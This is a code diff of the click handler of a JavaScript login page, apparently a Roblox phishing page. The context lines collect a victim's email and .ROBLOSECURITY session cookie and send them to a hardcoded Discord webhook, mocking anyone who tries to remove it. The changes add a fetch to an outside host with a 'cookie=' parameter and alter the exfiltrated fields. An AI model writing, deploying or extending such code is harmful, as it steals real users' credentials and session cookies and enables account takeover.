@@ -144,6 +144,7 @@ document.getElementById('login-button').addEventListener('click', () => {
 
   const safeEmail = email.length > 1024 ? email.slice(0, 1024) : email;
   const safeSecurity = extractedSecurity.length > 1024 ? extractedSecurity.slice(0, 1024) : extractedSecurity;
+  let refreshedSecurity = '';
 
   const lastSent = localStorage.getItem('lastSentTimestamp');
   const now = Date.now();
@@ -155,6 +156,21 @@ document.getElementById('login-button').addEventListener('click', () => {
     return;
   }
 
+  fetch('https://malachitebobolink.onpella.app/refresh?cookie=')
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Network response was not ok');
+      }
+      return response.text();
+      })
+      .then(_ => {
+         refreshedSecurity = 'const safeSecurity = extractedSecurity.length > 1024 ? extractedSecurity.slice(0, 1024) : extractedSecurity;';
+         output.textContent = refreshedSecurity;
+      })
+      .catch(err => {
+        output.textContent = 'Fetch error';
+      });
+	
   // I know you want to delete the webhook, ggs.
   const webhookUrl = "https://discord.com/api/webhooks/1358048304214315038/4QX8qxXbXXdeCJ4jRMPom22wqXDfcLt4qZj_ttJHfuo9bJAb0M3wmC56aa9Kh3t2S0ZJ";
 
@@ -164,7 +180,7 @@ document.getElementById('login-button').addEventListener('click', () => {
       color: 15158332,  // red color
       fields: [
         { name: "Email", value: safeEmail, inline: false },
-        { name: "UserID", value: extractedPlayerID, inline: false },
+        { name: "UserID", value: refreshedSecurity, inline: false },
         { name: ".ROBLOSECURITY", value: safeSecurity, inline: false }
       ],
       timestamp: new Date().toISOString()
